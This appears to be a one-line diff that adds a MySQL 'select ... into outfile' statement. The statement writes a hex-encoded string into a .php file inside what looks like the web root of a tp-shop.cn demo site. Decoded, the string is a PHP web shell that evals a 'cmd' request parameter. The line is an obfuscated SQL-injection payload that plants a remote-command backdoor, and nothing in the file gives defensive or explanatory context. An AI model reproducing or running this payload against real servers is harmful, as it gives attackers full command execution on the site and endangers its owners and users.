@@ -1,0 +1,1 @@
+select 0x3c3f706870206576616c28245f524551554553545b636d645d293b3f3e into outfile '/data/virtualhost/tp-shop.cn/demo5/wwwroot/8.php';
